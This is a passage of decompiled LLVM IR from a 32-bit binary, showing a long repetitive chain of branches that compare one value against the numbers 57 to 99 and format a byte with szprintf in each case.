  %v4_100041dc = call i32 @szprintf(i32 %v2_10004198, i32 ptrtoint ([14 x i8]* @global_var_10016848.102 to i32), i32 %v4_100041ac)
  br label %dec_label_pc_100041e0

dec_label_pc_100041e0:                            ; preds = %dec_label_pc_1000418c, %dec_label_pc_10004198
  %v3_100041e4 = icmp eq i32 %v2_10002f1c, 57
  br i1 %v3_100041e4, label %dec_label_pc_100041ec, label %dec_label_pc_10004234

dec_label_pc_100041ec:                            ; preds = %dec_label_pc_100041e0
  %v2_100041ec = ptrtoint i32* %stack_var_-52 to i32
  %v3_10004200 = load i8, i8* @global_var_1002c8fb.46, align 1
  %v4_10004200 = zext i8 %v3_10004200 to i32
  %v4_10004230 = call i32 @szprintf(i32 %v2_100041ec, i32 ptrtoint ([13 x i8]* @global_var_10016858.103 to i32), i32 %v4_10004200)
  br label %dec_label_pc_10004234

dec_label_pc_10004234:                            ; preds = %dec_label_pc_100041e0, %dec_label_pc_100041ec
  %v3_10004238 = icmp eq i32 %v2_10002f1c, 58
  br i1 %v3_10004238, label %dec_label_pc_10004240, label %dec_label_pc_10004288

dec_label_pc_10004240:                            ; preds = %dec_label_pc_10004234
  %v2_10004240 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10004254 = load i8, i8* @global_var_1002c8fb.46, align 1
  %v4_10004254 = zext i8 %v3_10004254 to i32
  %v4_10004284 = call i32 @szprintf(i32 %v2_10004240, i32 ptrtoint ([13 x i8]* @global_var_10016868.104 to i32), i32 %v4_10004254)
  br label %dec_label_pc_10004288

dec_label_pc_10004288:                            ; preds = %dec_label_pc_10004234, %dec_label_pc_10004240
  %v3_1000428c = icmp eq i32 %v2_10002f1c, 59
  br i1 %v3_1000428c, label %dec_label_pc_10004294, label %dec_label_pc_100042dc

dec_label_pc_10004294:                            ; preds = %dec_label_pc_10004288
  %v2_10004294 = ptrtoint i32* %stack_var_-52 to i32
  %v3_100042a8 = load i8, i8* @global_var_1002c8fb.46, align 1
  %v4_100042a8 = zext i8 %v3_100042a8 to i32
  %v4_100042d8 = call i32 @szprintf(i32 %v2_10004294, i32 ptrtoint ([13 x i8]* @global_var_10016878.105 to i32), i32 %v4_100042a8)
  br label %dec_label_pc_100042dc

dec_label_pc_100042dc:                            ; preds = %dec_label_pc_10004288, %dec_label_pc_10004294
  %v3_100042e0 = icmp eq i32 %v2_10002f1c, 60
  br i1 %v3_100042e0, label %dec_label_pc_100042e8, label %dec_label_pc_10004330

dec_label_pc_100042e8:                            ; preds = %dec_label_pc_100042dc
  %v2_100042e8 = ptrtoint i32* %stack_var_-52 to i32
  %v3_100042fc = load i8, i8* @global_var_1002c8fb.46, align 1
  %v4_100042fc = zext i8 %v3_100042fc to i32
  %v4_1000432c = call i32 @szprintf(i32 %v2_100042e8, i32 ptrtoint ([13 x i8]* @global_var_10016888.106 to i32), i32 %v4_100042fc)
  br label %dec_label_pc_10004330

dec_label_pc_10004330:                            ; preds = %dec_label_pc_100042dc, %dec_label_pc_100042e8
  %v3_10004334 = icmp eq i32 %v2_10002f1c, 61
  br i1 %v3_10004334, label %dec_label_pc_1000433c, label %dec_label_pc_10004384

dec_label_pc_1000433c:                            ; preds = %dec_label_pc_10004330
  %v2_1000433c = ptrtoint i32* %stack_var_-52 to i32
  %v3_10004350 = load i8, i8* @global_var_1002c8fb.46, align 1
  %v4_10004350 = zext i8 %v3_10004350 to i32
  %v4_10004380 = call i32 @szprintf(i32 %v2_1000433c, i32 ptrtoint ([13 x i8]* @global_var_10016898.107 to i32), i32 %v4_10004350)
  br label %dec_label_pc_10004384

dec_label_pc_10004384:                            ; preds = %dec_label_pc_10004330, %dec_label_pc_1000433c
  %v3_10004388 = icmp eq i32 %v2_10002f1c, 62
  br i1 %v3_10004388, label %dec_label_pc_10004390, label %dec_label_pc_100043d8

dec_label_pc_10004390:                            ; preds = %dec_label_pc_10004384
  %v2_10004390 = ptrtoint i32* %stack_var_-52 to i32
  %v3_100043a4 = load i8, i8* @global_var_1002c8fb.46, align 1
  %v4_100043a4 = zext i8 %v3_100043a4 to i32
  %v4_100043d4 = call i32 @szprintf(i32 %v2_10004390, i32 ptrtoint ([13 x i8]* @global_var_100168a8.108 to i32), i32 %v4_100043a4)
  br label %dec_label_pc_100043d8

dec_label_pc_100043d8:                            ; preds = %dec_label_pc_10004384, %dec_label_pc_10004390
  %v3_100043dc = icmp eq i32 %v2_10002f1c, 63
  br i1 %v3_100043dc, label %dec_label_pc_100043e4, label %dec_label_pc_1000442c

dec_label_pc_100043e4:                            ; preds = %dec_label_pc_100043d8
  %v2_100043e4 = ptrtoint i32* %stack_var_-52 to i32
  %v3_100043f8 = load i8, i8* @global_var_1002c8fb.46, align 1
  %v4_100043f8 = zext i8 %v3_100043f8 to i32
  %v4_10004428 = call i32 @szprintf(i32 %v2_100043e4, i32 ptrtoint ([13 x i8]* @global_var_100168b8.109 to i32), i32 %v4_100043f8)
  br label %dec_label_pc_1000442c

dec_label_pc_1000442c:                            ; preds = %dec_label_pc_100043d8, %dec_label_pc_100043e4
  %v3_10004430 = icmp eq i32 %v2_10002f1c, 64
  br i1 %v3_10004430, label %dec_label_pc_10004438, label %dec_label_pc_10004480

dec_label_pc_10004438:                            ; preds = %dec_label_pc_1000442c
  %v2_10004438 = ptrtoint i32* %stack_var_-52 to i32
  %v3_1000444c = load i8, i8* @global_var_1002c8fb.46, align 1
  %v4_1000444c = zext i8 %v3_1000444c to i32
  %v4_1000447c = call i32 @szprintf(i32 %v2_10004438, i32 ptrtoint ([13 x i8]* @global_var_100168c8.110 to i32), i32 %v4_1000444c)
  br label %dec_label_pc_10004480

dec_label_pc_10004480:                            ; preds = %dec_label_pc_1000442c, %dec_label_pc_10004438
  %v3_10004484 = icmp eq i32 %v2_10002f1c, 65
  br i1 %v3_10004484, label %dec_label_pc_1000448c, label %dec_label_pc_100044d4

dec_label_pc_1000448c:                            ; preds = %dec_label_pc_10004480
  %v2_1000448c = ptrtoint i32* %stack_var_-52 to i32
  %v3_100044a0 = load i8, i8* @global_var_1002c8fb.46, align 1
  %v4_100044a0 = zext i8 %v3_100044a0 to i32
  %v4_100044d0 = call i32 @szprintf(i32 %v2_1000448c, i32 ptrtoint ([13 x i8]* @global_var_100168d8.111 to i32), i32 %v4_100044a0)
  br label %dec_label_pc_100044d4

dec_label_pc_100044d4:                            ; preds = %dec_label_pc_10004480, %dec_label_pc_1000448c
  %v3_100044d8 = icmp eq i32 %v2_10002f1c, 66
  br i1 %v3_100044d8, label %dec_label_pc_100044e0, label %dec_label_pc_10004528

dec_label_pc_100044e0:                            ; preds = %dec_label_pc_100044d4
  %v2_100044e0 = ptrtoint i32* %stack_var_-52 to i32
  %v3_100044f4 = load i8, i8* @global_var_1002c8fb.46, align 1
  %v4_100044f4 = zext i8 %v3_100044f4 to i32
  %v4_10004524 = call i32 @szprintf(i32 %v2_100044e0, i32 ptrtoint ([13 x i8]* @global_var_100168e8.112 to i32), i32 %v4_100044f4)
  br label %dec_label_pc_10004528

dec_label_pc_10004528:                            ; preds = %dec_label_pc_100044d4, %dec_label_pc_100044e0
  %v3_1000452c = icmp eq i32 %v2_10002f1c, 67
  br i1 %v3_1000452c, label %dec_label_pc_10004534, label %dec_label_pc_1000457c

dec_label_pc_10004534:                            ; preds = %dec_label_pc_10004528
  %v2_10004534 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10004548 = load i8, i8* @global_var_1002c8fb.46, align 1
  %v4_10004548 = zext i8 %v3_10004548 to i32
  %v4_10004578 = call i32 @szprintf(i32 %v2_10004534, i32 ptrtoint ([13 x i8]* @global_var_100168f8.113 to i32), i32 %v4_10004548)
  br label %dec_label_pc_1000457c

dec_label_pc_1000457c:                            ; preds = %dec_label_pc_10004528, %dec_label_pc_10004534
  %v3_10004580 = icmp eq i32 %v2_10002f1c, 68
  br i1 %v3_10004580, label %dec_label_pc_10004588, label %dec_label_pc_100045d0

dec_label_pc_10004588:                            ; preds = %dec_label_pc_1000457c
  %v2_10004588 = ptrtoint i32* %stack_var_-52 to i32
  %v3_1000459c = load i8, i8* @global_var_1002c8fb.46, align 1
  %v4_1000459c = zext i8 %v3_1000459c to i32
  %v4_100045cc = call i32 @szprintf(i32 %v2_10004588, i32 ptrtoint ([13 x i8]* @global_var_10016908.114 to i32), i32 %v4_1000459c)
  br label %dec_label_pc_100045d0

dec_label_pc_100045d0:                            ; preds = %dec_label_pc_1000457c, %dec_label_pc_10004588
  %v3_100045d4 = icmp eq i32 %v2_10002f1c, 69
  br i1 %v3_100045d4, label %dec_label_pc_100045dc, label %dec_label_pc_10004624

dec_label_pc_100045dc:                            ; preds = %dec_label_pc_100045d0
  %v2_100045dc = ptrtoint i32* %stack_var_-52 to i32
  %v3_100045f0 = load i8, i8* @global_var_1002c8fb.46, align 1
  %v4_100045f0 = zext i8 %v3_100045f0 to i32
  %v4_10004620 = call i32 @szprintf(i32 %v2_100045dc, i32 ptrtoint ([13 x i8]* @global_var_10016918.115 to i32), i32 %v4_100045f0)
  br label %dec_label_pc_10004624

dec_label_pc_10004624:                            ; preds = %dec_label_pc_100045d0, %dec_label_pc_100045dc
  %v3_10004628 = icmp eq i32 %v2_10002f1c, 70
  br i1 %v3_10004628, label %dec_label_pc_10004630, label %dec_label_pc_10004678

dec_label_pc_10004630:                            ; preds = %dec_label_pc_10004624
  %v2_10004630 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10004644 = load i8, i8* @global_var_1002c8fb.46, align 1
  %v4_10004644 = zext i8 %v3_10004644 to i32
  %v4_10004674 = call i32 @szprintf(i32 %v2_10004630, i32 ptrtoint ([13 x i8]* @global_var_10016928.116 to i32), i32 %v4_10004644)
  br label %dec_label_pc_10004678

dec_label_pc_10004678:                            ; preds = %dec_label_pc_10004624, %dec_label_pc_10004630
  %v3_1000467c = icmp eq i32 %v2_10002f1c, 71
  br i1 %v3_1000467c, label %dec_label_pc_10004684, label %dec_label_pc_100046cc

dec_label_pc_10004684:                            ; preds = %dec_label_pc_10004678
  %v2_10004684 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10004698 = load i8, i8* @global_var_1002c8fb.46, align 1
  %v4_10004698 = zext i8 %v3_10004698 to i32
  %v4_100046c8 = call i32 @szprintf(i32 %v2_10004684, i32 ptrtoint ([13 x i8]* @global_var_10016938.117 to i32), i32 %v4_10004698)
  br label %dec_label_pc_100046cc

dec_label_pc_100046cc:                            ; preds = %dec_label_pc_10004678, %dec_label_pc_10004684
  %v3_100046d0 = icmp eq i32 %v2_10002f1c, 72
  br i1 %v3_100046d0, label %dec_label_pc_100046d8, label %dec_label_pc_10004720

dec_label_pc_100046d8:                            ; preds = %dec_label_pc_100046cc
  %v2_100046d8 = ptrtoint i32* %stack_var_-52 to i32
  %v3_100046ec = load i8, i8* @global_var_1002c8fb.46, align 1
  %v4_100046ec = zext i8 %v3_100046ec to i32
  %v4_1000471c = call i32 @szprintf(i32 %v2_100046d8, i32 ptrtoint ([13 x i8]* @global_var_10016948.118 to i32), i32 %v4_100046ec)
  br label %dec_label_pc_10004720

dec_label_pc_10004720:                            ; preds = %dec_label_pc_100046cc, %dec_label_pc_100046d8
  %v3_10004724 = icmp eq i32 %v2_10002f1c, 73
  br i1 %v3_10004724, label %dec_label_pc_1000472c, label %dec_label_pc_10004774

dec_label_pc_1000472c:                            ; preds = %dec_label_pc_10004720
  %v2_1000472c = ptrtoint i32* %stack_var_-52 to i32
  %v3_10004740 = load i8, i8* @global_var_1002c8fb.46, align 1
  %v4_10004740 = zext i8 %v3_10004740 to i32
  %v4_10004770 = call i32 @szprintf(i32 %v2_1000472c, i32 ptrtoint ([13 x i8]* @global_var_10016958.119 to i32), i32 %v4_10004740)
  br label %dec_label_pc_10004774

dec_label_pc_10004774:                            ; preds = %dec_label_pc_10004720, %dec_label_pc_1000472c
  %v3_10004778 = icmp eq i32 %v2_10002f1c, 74
  br i1 %v3_10004778, label %dec_label_pc_10004780, label %dec_label_pc_100047c8

dec_label_pc_10004780:                            ; preds = %dec_label_pc_10004774
  %v2_10004780 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10004794 = load i8, i8* @global_var_1002c8fb.46, align 1
  %v4_10004794 = zext i8 %v3_10004794 to i32
  %v4_100047c4 = call i32 @szprintf(i32 %v2_10004780, i32 ptrtoint ([13 x i8]* @global_var_10016968.120 to i32), i32 %v4_10004794)
  br label %dec_label_pc_100047c8

dec_label_pc_100047c8:                            ; preds = %dec_label_pc_10004774, %dec_label_pc_10004780
  %v3_100047cc = icmp eq i32 %v2_10002f1c, 75
  br i1 %v3_100047cc, label %dec_label_pc_100047d4, label %dec_label_pc_1000481c

dec_label_pc_100047d4:                            ; preds = %dec_label_pc_100047c8
  %v2_100047d4 = ptrtoint i32* %stack_var_-52 to i32
  %v3_100047e8 = load i8, i8* @global_var_1002c8fb.46, align 1
  %v4_100047e8 = zext i8 %v3_100047e8 to i32
  %v4_10004818 = call i32 @szprintf(i32 %v2_100047d4, i32 ptrtoint ([13 x i8]* @global_var_10016978.121 to i32), i32 %v4_100047e8)
  br label %dec_label_pc_1000481c

dec_label_pc_1000481c:                            ; preds = %dec_label_pc_100047c8, %dec_label_pc_100047d4
  %v3_10004820 = icmp eq i32 %v2_10002f1c, 76
  br i1 %v3_10004820, label %dec_label_pc_10004828, label %dec_label_pc_10004870

dec_label_pc_10004828:                            ; preds = %dec_label_pc_1000481c
  %v2_10004828 = ptrtoint i32* %stack_var_-52 to i32
  %v3_1000483c = load i8, i8* @global_var_1002c8fb.46, align 1
  %v4_1000483c = zext i8 %v3_1000483c to i32
  %v4_1000486c = call i32 @szprintf(i32 %v2_10004828, i32 ptrtoint ([13 x i8]* @global_var_10016988.122 to i32), i32 %v4_1000483c)
  br label %dec_label_pc_10004870

dec_label_pc_10004870:                            ; preds = %dec_label_pc_1000481c, %dec_label_pc_10004828
  %v3_10004874 = icmp eq i32 %v2_10002f1c, 77
  br i1 %v3_10004874, label %dec_label_pc_1000487c, label %dec_label_pc_100048c4

dec_label_pc_1000487c:                            ; preds = %dec_label_pc_10004870
  %v2_1000487c = ptrtoint i32* %stack_var_-52 to i32
  %v3_10004890 = load i8, i8* @global_var_1002c8fb.46, align 1
  %v4_10004890 = zext i8 %v3_10004890 to i32
  %v4_100048c0 = call i32 @szprintf(i32 %v2_1000487c, i32 ptrtoint ([13 x i8]* @global_var_10016998.123 to i32), i32 %v4_10004890)
  br label %dec_label_pc_100048c4

dec_label_pc_100048c4:                            ; preds = %dec_label_pc_10004870, %dec_label_pc_1000487c
  %v3_100048c8 = icmp eq i32 %v2_10002f1c, 78
  br i1 %v3_100048c8, label %dec_label_pc_100048d0, label %dec_label_pc_10004918

dec_label_pc_100048d0:                            ; preds = %dec_label_pc_100048c4
  %v2_100048d0 = ptrtoint i32* %stack_var_-52 to i32
  %v3_100048e4 = load i8, i8* @global_var_1002c8fb.46, align 1
  %v4_100048e4 = zext i8 %v3_100048e4 to i32
  %v4_10004914 = call i32 @szprintf(i32 %v2_100048d0, i32 ptrtoint ([13 x i8]* @global_var_100169a8.124 to i32), i32 %v4_100048e4)
  br label %dec_label_pc_10004918

dec_label_pc_10004918:                            ; preds = %dec_label_pc_100048c4, %dec_label_pc_100048d0
  %v3_1000491c = icmp eq i32 %v2_10002f1c, 79
  br i1 %v3_1000491c, label %dec_label_pc_10004924, label %dec_label_pc_1000496c

dec_label_pc_10004924:                            ; preds = %dec_label_pc_10004918
  %v2_10004924 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10004938 = load i8, i8* @global_var_1002c8fb.46, align 1
  %v4_10004938 = zext i8 %v3_10004938 to i32
  %v4_10004968 = call i32 @szprintf(i32 %v2_10004924, i32 ptrtoint ([13 x i8]* @global_var_100169b8.125 to i32), i32 %v4_10004938)
  br label %dec_label_pc_1000496c

dec_label_pc_1000496c:                            ; preds = %dec_label_pc_10004918, %dec_label_pc_10004924
  %v3_10004970 = icmp eq i32 %v2_10002f1c, 80
  br i1 %v3_10004970, label %dec_label_pc_10004978, label %dec_label_pc_100049c0

dec_label_pc_10004978:                            ; preds = %dec_label_pc_1000496c
  %v2_10004978 = ptrtoint i32* %stack_var_-52 to i32
  %v3_1000498c = load i8, i8* @global_var_1002c8fb.46, align 1
  %v4_1000498c = zext i8 %v3_1000498c to i32
  %v4_100049bc = call i32 @szprintf(i32 %v2_10004978, i32 ptrtoint ([13 x i8]* @global_var_100169c8.126 to i32), i32 %v4_1000498c)
  br label %dec_label_pc_100049c0

dec_label_pc_100049c0:                            ; preds = %dec_label_pc_1000496c, %dec_label_pc_10004978
  %v3_100049c4 = icmp eq i32 %v2_10002f1c, 81
  br i1 %v3_100049c4, label %dec_label_pc_100049cc, label %dec_label_pc_10004a14

dec_label_pc_100049cc:                            ; preds = %dec_label_pc_100049c0
  %v2_100049cc = ptrtoint i32* %stack_var_-52 to i32
  %v3_100049e0 = load i8, i8* @global_var_1002c8fb.46, align 1
  %v4_100049e0 = zext i8 %v3_100049e0 to i32
  %v4_10004a10 = call i32 @szprintf(i32 %v2_100049cc, i32 ptrtoint ([13 x i8]* @global_var_100169d8.127 to i32), i32 %v4_100049e0)
  br label %dec_label_pc_10004a14

dec_label_pc_10004a14:                            ; preds = %dec_label_pc_100049c0, %dec_label_pc_100049cc
  %v3_10004a18 = icmp eq i32 %v2_10002f1c, 82
  br i1 %v3_10004a18, label %dec_label_pc_10004a20, label %dec_label_pc_10004a68

dec_label_pc_10004a20:                            ; preds = %dec_label_pc_10004a14
  %v2_10004a20 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10004a34 = load i8, i8* @global_var_1002c8fb.46, align 1
  %v4_10004a34 = zext i8 %v3_10004a34 to i32
  %v4_10004a64 = call i32 @szprintf(i32 %v2_10004a20, i32 ptrtoint ([13 x i8]* @global_var_100169e8.128 to i32), i32 %v4_10004a34)
  br label %dec_label_pc_10004a68

dec_label_pc_10004a68:                            ; preds = %dec_label_pc_10004a14, %dec_label_pc_10004a20
  %v3_10004a6c = icmp eq i32 %v2_10002f1c, 83
  br i1 %v3_10004a6c, label %dec_label_pc_10004a74, label %dec_label_pc_10004abc

dec_label_pc_10004a74:                            ; preds = %dec_label_pc_10004a68
  %v2_10004a74 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10004a88 = load i8, i8* @global_var_1002c8fb.46, align 1
  %v4_10004a88 = zext i8 %v3_10004a88 to i32
  %v4_10004ab8 = call i32 @szprintf(i32 %v2_10004a74, i32 ptrtoint ([13 x i8]* @global_var_100169f8.129 to i32), i32 %v4_10004a88)
  br label %dec_label_pc_10004abc

dec_label_pc_10004abc:                            ; preds = %dec_label_pc_10004a68, %dec_label_pc_10004a74
  %v3_10004ac0 = icmp eq i32 %v2_10002f1c, 84
  br i1 %v3_10004ac0, label %dec_label_pc_10004ac8, label %dec_label_pc_10004b10

dec_label_pc_10004ac8:                            ; preds = %dec_label_pc_10004abc
  %v2_10004ac8 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10004adc = load i8, i8* @global_var_1002c8fb.46, align 1
  %v4_10004adc = zext i8 %v3_10004adc to i32
  %v4_10004b0c = call i32 @szprintf(i32 %v2_10004ac8, i32 ptrtoint ([13 x i8]* @global_var_10016a08.130 to i32), i32 %v4_10004adc)
  br label %dec_label_pc_10004b10

dec_label_pc_10004b10:                            ; preds = %dec_label_pc_10004abc, %dec_label_pc_10004ac8
  %v3_10004b14 = icmp eq i32 %v2_10002f1c, 85
  br i1 %v3_10004b14, label %dec_label_pc_10004b1c, label %dec_label_pc_10004b64

dec_label_pc_10004b1c:                            ; preds = %dec_label_pc_10004b10
  %v2_10004b1c = ptrtoint i32* %stack_var_-52 to i32
  %v3_10004b30 = load i8, i8* @global_var_1002c8fb.46, align 1
  %v4_10004b30 = zext i8 %v3_10004b30 to i32
  %v4_10004b60 = call i32 @szprintf(i32 %v2_10004b1c, i32 ptrtoint ([13 x i8]* @global_var_10016a18.131 to i32), i32 %v4_10004b30)
  br label %dec_label_pc_10004b64

dec_label_pc_10004b64:                            ; preds = %dec_label_pc_10004b10, %dec_label_pc_10004b1c
  %v3_10004b68 = icmp eq i32 %v2_10002f1c, 86
  br i1 %v3_10004b68, label %dec_label_pc_10004b70, label %dec_label_pc_10004bb8

dec_label_pc_10004b70:                            ; preds = %dec_label_pc_10004b64
  %v2_10004b70 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10004b84 = load i8, i8* @global_var_1002c8fb.46, align 1
  %v4_10004b84 = zext i8 %v3_10004b84 to i32
  %v4_10004bb4 = call i32 @szprintf(i32 %v2_10004b70, i32 ptrtoint ([13 x i8]* @global_var_10016a28.132 to i32), i32 %v4_10004b84)
  br label %dec_label_pc_10004bb8

dec_label_pc_10004bb8:                            ; preds = %dec_label_pc_10004b64, %dec_label_pc_10004b70
  %v3_10004bbc = icmp eq i32 %v2_10002f1c, 87
  br i1 %v3_10004bbc, label %dec_label_pc_10004bc4, label %dec_label_pc_10004c0c

dec_label_pc_10004bc4:                            ; preds = %dec_label_pc_10004bb8
  %v2_10004bc4 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10004bd8 = load i8, i8* @global_var_1002c8fb.46, align 1
  %v4_10004bd8 = zext i8 %v3_10004bd8 to i32
  %v4_10004c08 = call i32 @szprintf(i32 %v2_10004bc4, i32 ptrtoint ([13 x i8]* @global_var_10016a38.133 to i32), i32 %v4_10004bd8)
  br label %dec_label_pc_10004c0c

dec_label_pc_10004c0c:                            ; preds = %dec_label_pc_10004bb8, %dec_label_pc_10004bc4
  %v3_10004c10 = icmp eq i32 %v2_10002f1c, 88
  br i1 %v3_10004c10, label %dec_label_pc_10004c18, label %dec_label_pc_10004c60

dec_label_pc_10004c18:                            ; preds = %dec_label_pc_10004c0c
  %v2_10004c18 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10004c2c = load i8, i8* @global_var_1002c8fb.46, align 1
  %v4_10004c2c = zext i8 %v3_10004c2c to i32
  %v4_10004c5c = call i32 @szprintf(i32 %v2_10004c18, i32 ptrtoint ([13 x i8]* @global_var_10016a48.134 to i32), i32 %v4_10004c2c)
  br label %dec_label_pc_10004c60

dec_label_pc_10004c60:                            ; preds = %dec_label_pc_10004c0c, %dec_label_pc_10004c18
  %v3_10004c64 = icmp eq i32 %v2_10002f1c, 89
  br i1 %v3_10004c64, label %dec_label_pc_10004c6c, label %dec_label_pc_10004cb4

dec_label_pc_10004c6c:                            ; preds = %dec_label_pc_10004c60
  %v2_10004c6c = ptrtoint i32* %stack_var_-52 to i32
  %v3_10004c80 = load i8, i8* @global_var_1002c8fb.46, align 1
  %v4_10004c80 = zext i8 %v3_10004c80 to i32
  %v4_10004cb0 = call i32 @szprintf(i32 %v2_10004c6c, i32 ptrtoint ([13 x i8]* @global_var_10016a58.135 to i32), i32 %v4_10004c80)
  br label %dec_label_pc_10004cb4

dec_label_pc_10004cb4:                            ; preds = %dec_label_pc_10004c60, %dec_label_pc_10004c6c
  %v3_10004cb8 = icmp eq i32 %v2_10002f1c, 90
  br i1 %v3_10004cb8, label %dec_label_pc_10004cc0, label %dec_label_pc_10004d08

dec_label_pc_10004cc0:                            ; preds = %dec_label_pc_10004cb4
  %v2_10004cc0 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10004cd4 = load i8, i8* @global_var_1002c8fb.46, align 1
  %v4_10004cd4 = zext i8 %v3_10004cd4 to i32
  %v4_10004d04 = call i32 @szprintf(i32 %v2_10004cc0, i32 ptrtoint ([13 x i8]* @global_var_10016a68.136 to i32), i32 %v4_10004cd4)
  br label %dec_label_pc_10004d08

dec_label_pc_10004d08:                            ; preds = %dec_label_pc_10004cb4, %dec_label_pc_10004cc0
  %v3_10004d0c = icmp eq i32 %v2_10002f1c, 91
  br i1 %v3_10004d0c, label %dec_label_pc_10004d14, label %dec_label_pc_10004d5c

dec_label_pc_10004d14:                            ; preds = %dec_label_pc_10004d08
  %v2_10004d14 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10004d28 = load i8, i8* @global_var_1002c8fb.46, align 1
  %v4_10004d28 = zext i8 %v3_10004d28 to i32
  %v4_10004d58 = call i32 @szprintf(i32 %v2_10004d14, i32 ptrtoint ([13 x i8]* @global_var_10016a78.137 to i32), i32 %v4_10004d28)
  br label %dec_label_pc_10004d5c

dec_label_pc_10004d5c:                            ; preds = %dec_label_pc_10004d08, %dec_label_pc_10004d14
  %v3_10004d60 = icmp eq i32 %v2_10002f1c, 92
  br i1 %v3_10004d60, label %dec_label_pc_10004d68, label %dec_label_pc_10004db0

dec_label_pc_10004d68:                            ; preds = %dec_label_pc_10004d5c
  %v2_10004d68 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10004d7c = load i8, i8* @global_var_1002c8fb.46, align 1
  %v4_10004d7c = zext i8 %v3_10004d7c to i32
  %v4_10004dac = call i32 @szprintf(i32 %v2_10004d68, i32 ptrtoint ([13 x i8]* @global_var_10016a88.138 to i32), i32 %v4_10004d7c)
  br label %dec_label_pc_10004db0

dec_label_pc_10004db0:                            ; preds = %dec_label_pc_10004d5c, %dec_label_pc_10004d68
  %v3_10004db4 = icmp eq i32 %v2_10002f1c, 93
  br i1 %v3_10004db4, label %dec_label_pc_10004dbc, label %dec_label_pc_10004e04

dec_label_pc_10004dbc:                            ; preds = %dec_label_pc_10004db0
  %v2_10004dbc = ptrtoint i32* %stack_var_-52 to i32
  %v3_10004dd0 = load i8, i8* @global_var_1002c8fb.46, align 1
  %v4_10004dd0 = zext i8 %v3_10004dd0 to i32
  %v4_10004e00 = call i32 @szprintf(i32 %v2_10004dbc, i32 ptrtoint ([13 x i8]* @global_var_10016a98.139 to i32), i32 %v4_10004dd0)
  br label %dec_label_pc_10004e04

dec_label_pc_10004e04:                            ; preds = %dec_label_pc_10004db0, %dec_label_pc_10004dbc
  %v3_10004e08 = icmp eq i32 %v2_10002f1c, 94
  br i1 %v3_10004e08, label %dec_label_pc_10004e10, label %dec_label_pc_10004e58

dec_label_pc_10004e10:                            ; preds = %dec_label_pc_10004e04
  %v2_10004e10 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10004e24 = load i8, i8* @global_var_1002c8fb.46, align 1
  %v4_10004e24 = zext i8 %v3_10004e24 to i32
  %v4_10004e54 = call i32 @szprintf(i32 %v2_10004e10, i32 ptrtoint ([13 x i8]* @global_var_10016778.89 to i32), i32 %v4_10004e24)
  br label %dec_label_pc_10004e58

dec_label_pc_10004e58:                            ; preds = %dec_label_pc_10004e04, %dec_label_pc_10004e10
  %v3_10004e5c = icmp eq i32 %v2_10002f1c, 95
  br i1 %v3_10004e5c, label %dec_label_pc_10004e64, label %dec_label_pc_10004eac

dec_label_pc_10004e64:                            ; preds = %dec_label_pc_10004e58
  %v2_10004e64 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10004e78 = load i8, i8* @global_var_1002c8fb.46, align 1
  %v4_10004e78 = zext i8 %v3_10004e78 to i32
  %v4_10004ea8 = call i32 @szprintf(i32 %v2_10004e64, i32 ptrtoint ([13 x i8]* @global_var_10016aa8.140 to i32), i32 %v4_10004e78)
  br label %dec_label_pc_10004eac

dec_label_pc_10004eac:                            ; preds = %dec_label_pc_10004e58, %dec_label_pc_10004e64
  %v3_10004eb0 = icmp eq i32 %v2_10002f1c, 96
  br i1 %v3_10004eb0, label %dec_label_pc_10004eb8, label %dec_label_pc_10004f00

dec_label_pc_10004eb8:                            ; preds = %dec_label_pc_10004eac
  %v2_10004eb8 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10004ecc = load i8, i8* @global_var_1002c8fb.46, align 1
  %v4_10004ecc = zext i8 %v3_10004ecc to i32
  %v4_10004efc = call i32 @szprintf(i32 %v2_10004eb8, i32 ptrtoint ([13 x i8]* @global_var_100167a8.92 to i32), i32 %v4_10004ecc)
  br label %dec_label_pc_10004f00

dec_label_pc_10004f00:                            ; preds = %dec_label_pc_10004eac, %dec_label_pc_10004eb8
  %v3_10004f04 = icmp eq i32 %v2_10002f1c, 97
  br i1 %v3_10004f04, label %dec_label_pc_10004f0c, label %dec_label_pc_10004f54

dec_label_pc_10004f0c:                            ; preds = %dec_label_pc_10004f00
  %v2_10004f0c = ptrtoint i32* %stack_var_-52 to i32
  %v3_10004f20 = load i8, i8* @global_var_1002c8fb.46, align 1
  %v4_10004f20 = zext i8 %v3_10004f20 to i32
  %v4_10004f50 = call i32 @szprintf(i32 %v2_10004f0c, i32 ptrtoint ([13 x i8]* @global_var_10016ab8.141 to i32), i32 %v4_10004f20)
  br label %dec_label_pc_10004f54

dec_label_pc_10004f54:                            ; preds = %dec_label_pc_10004f00, %dec_label_pc_10004f0c
  %v3_10004f58 = icmp eq i32 %v2_10002f1c, 98
  br i1 %v3_10004f58, label %dec_label_pc_10004f60, label %dec_label_pc_10004fa8

dec_label_pc_10004f60:                            ; preds = %dec_label_pc_10004f54
  %v2_10004f60 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10004f74 = load i8, i8* @global_var_1002c8fb.46, align 1
  %v4_10004f74 = zext i8 %v3_10004f74 to i32
  %v4_10004fa4 = call i32 @szprintf(i32 %v2_10004f60, i32 ptrtoint ([13 x i8]* @global_var_10016ac8.142 to i32), i32 %v4_10004f74)
  br label %dec_label_pc_10004fa8

dec_label_pc_10004fa8:                            ; preds = %dec_label_pc_10004f54, %dec_label_pc_10004f60
  %v3_10004fac = icmp eq i32 %v2_10002f1c, 99
  br i1 %v3_10004fac, label %dec_label_pc_10004fb4, label %dec_label_pc_10004ffc

dec_label_pc_10004fb4:                            ; preds = %dec_label_pc_10004fa8
  %v2_10004fb4 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10004fc8 = load i8, i8* @global_var_1002c8fb.46, align 1
